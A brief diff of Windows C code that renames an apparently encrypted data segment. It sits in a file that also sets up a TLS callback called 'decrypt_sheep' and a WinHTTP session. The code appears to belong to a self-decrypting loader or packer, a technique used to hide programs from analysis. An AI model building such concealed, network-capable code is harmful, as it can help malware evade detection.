@@ -174,7 +174,7 @@ const PIMAGE_TLS_CALLBACK decrypt_callback = decrypt_sheep;
 #pragma const_seg(pop, c1)
 
 #pragma code_seg(push, r1, ".etext")
-#pragma data_seg(push, d1, ".edata")
+#pragma data_seg(push, d1, ".encd")
 HINTERNET init_winhttp(void) {
    return WinHttpOpen(L"Amethyst Labs/1.0",
                       WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
